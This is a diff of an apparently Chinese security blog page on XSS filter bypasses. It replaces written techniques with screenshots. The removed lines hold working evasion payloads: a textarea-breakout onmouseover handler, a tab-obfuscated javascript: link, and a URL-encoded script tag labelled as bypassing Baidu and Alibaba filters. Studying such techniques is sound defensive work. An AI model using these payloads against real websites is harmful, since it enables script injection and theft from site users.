@@ -240,32 +240,9 @@
 </ul>
 </li>
 </ul>
-<h3 id="2、XSS绕过手段"><a href="#2、XSS绕过手段" class="headerlink" title="2、XSS绕过手段"></a>2、XSS绕过手段</h3><p>双写、大小写、属性名、闭合绕过</p>
-<ul>
-<li><p>部分标签可以执行脚本，无需闭合，如div</p>
-<p><code>&lt;div id=&quot;body&quot;&gt;[输入]&lt;/div&gt;</code></p>
-</li>
-<li><p>部分标签无法执行脚本，需要先闭合</p>
-<ul>
-<li><code>&lt;title&gt;&lt;/title&gt;</code></li>
-<li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li>
-<li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li>
-<li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li>
-</ul>
-</li>
-</ul>
+<h3 id="2、XSS绕过手段"><a href="#2、XSS绕过手段" class="headerlink" title="2、XSS绕过手段"></a>2、XSS绕过手段</h3><p><img src="/images/XSS01.png" alt="XSS01"></p>
 <h4 id="（1）XSS简单基础绕过"><a href="#（1）XSS简单基础绕过" class="headerlink" title="（1）XSS简单基础绕过"></a>（1）XSS简单基础绕过</h4><p><img src="/images/XSS1.png" alt="XSS1"></p>
-<h4 id="（2）XSS混淆绕过"><a href="#（2）XSS混淆绕过" class="headerlink" title="（2）XSS混淆绕过"></a>（2）XSS混淆绕过</h4><ul>
-<li><p><code>&lt;/tExtArEa&gt;&#39;&quot;&lt;xhzeem attr=&quot;--- </code></p>
-<p>x&#x3D;”&#x3D;&#x3D;’&#x3D;’onmouseover&#x3D;confirm`x1s2s3&#96; style&#x3D;”display:block;width:1000px;height:1000px;background:red”&gt;— </p>
-<p>“&gt;</p>
-</li>
-<li><p><code>&lt;/tExtArEa&gt;&#39;&quot;&lt;a/href=&quot;ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab;[8680439..toString(30)]()&quot;&gt;click_me&lt;/a&gt;#</code></p>
-</li>
-<li><p><code>&lt;script%20type=&quot;text/javascript&quot;&gt;%20var%20reg%20=%20/test/;%20var%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20&lt;/script&gt;</code></p>
-<p>#bypass 百度，阿里巴巴</p>
-</li>
-</ul>
+<h4 id="（2）XSS混淆绕过"><a href="#（2）XSS混淆绕过" class="headerlink" title="（2）XSS混淆绕过"></a>（2）XSS混淆绕过</h4><p><img src="/images/XSS02.png" alt="XSS02"></p>
 <h4 id="（3）XSS编码加密绕过"><a href="#（3）XSS编码加密绕过" class="headerlink" title="（3）XSS编码加密绕过"></a>（3）XSS编码加密绕过</h4><p><img src="/images/XSS2.png" alt="XSS2"></p>
 <h4 id="（4）冷门标签绕过"><a href="#（4）冷门标签绕过" class="headerlink" title="（4）冷门标签绕过"></a>（4）冷门标签绕过</h4><p><img src="/images/XSS3.png" alt="XSS3"></p>
 <p><img src="/images/XSS4.png" alt="XSS4"></p>
